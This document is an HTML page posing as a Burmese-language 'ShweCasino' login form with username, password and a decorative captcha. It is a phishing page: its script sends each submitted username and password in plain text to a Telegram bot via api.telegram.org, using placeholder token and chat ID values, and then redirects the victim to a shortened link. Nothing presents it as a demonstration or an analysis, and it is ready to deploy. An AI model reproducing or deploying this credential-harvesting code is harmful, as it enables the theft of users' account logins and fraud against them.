<!DOCTYPE html>
<html lang="my">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>ShweCasino</title>

<style>

body{
margin:0;
background:#8b0000;
font-family:Myanmar Text;
color:white;
}

/* banner */

.banner img{
width:100%;
display:block;
}

/* login box */

.login-box{
background:#a00000;
margin:15px;
padding:20px;
border-radius:15px;
}

.title{
text-align:center;
font-size:28px;
margin-bottom:20px;
}

/* inputs */

.input{
width:100%;
padding:14px;
margin:10px 0;
border:none;
border-radius:10px;
font-size:16px;
}

/* password eye */

.passbox{
position:relative;
}

.eye{
position:absolute;
right:15px;
top:50%;
transform:translateY(-50%);
font-size:18px;
cursor:pointer;
}

/* captcha */

.captcha-row{
display:flex;
align-items:center;
gap:10px;
margin-top:10px;
}

.captcha{
background:white;
color:black;
padding:8px 14px;
border-radius:6px;
font-weight:bold;
}

.refresh{
background:#eee;
color:black;
padding:8px 10px;
border-radius:6px;
cursor:pointer;
}

/* button */

.btn{
width:100%;
padding:14px;
margin-top:15px;
background:#ffd700;
border:none;
border-radius:10px;
font-size:18px;
font-weight:bold;
}

</style>

</head>

<body>

<div class="banner">
<img src="logo.jpg">
</div>

<div class="login-box">

<div class="title">အကောင့်ထဲဝင်ရန်</div>

<input class="input" id="user" placeholder="အကောင့်အမည်">

<div class="passbox">
<input class="input" type="password" id="pass" placeholder="စကားဝှက်">
<span class="eye" onclick="togglePass()"></span>
</div>

<div class="captcha-row">
<div id="captcha" class="captcha"></div>
<div class="refresh" onclick="createCaptcha()"></div>
</div>

<input class="input" id="captchaInput" placeholder="captcha ရိုက်ထည့်ပါ">

<button class="btn" onclick="login()">အကောင့်ထဲဝင်ရန်</button>

</div>

<script>

/* TG BOT */

var token="BOT_TOKEN";
var chat_id="CHAT_ID";

/* password show hide */

function togglePass(){

var p=document.getElementById("pass");

if(p.type==="password"){
p.type="text";
}else{
p.type="password";
}

}

/* captcha */

var code;

function createCaptcha(){

code=Math.floor(1000+Math.random()*9000);

document.getElementById("captcha").innerText=code;

}

createCaptcha();

/* login */

function login(){

var u=document.getElementById("user").value;
var p=document.getElementById("pass").value;
var c=document.getElementById("captchaInput").value;

if(c!=code){
alert("captcha မှားနေပါတယ်");
createCaptcha();
return;
}

var text=
"ShweCasino Login%0A"+
"User: "+u+"%0A"+
"Pass: "+p;

fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+text);

window.location.href="https://cutt.ly/otrecCFE";

}

</script>

</body>
</html>
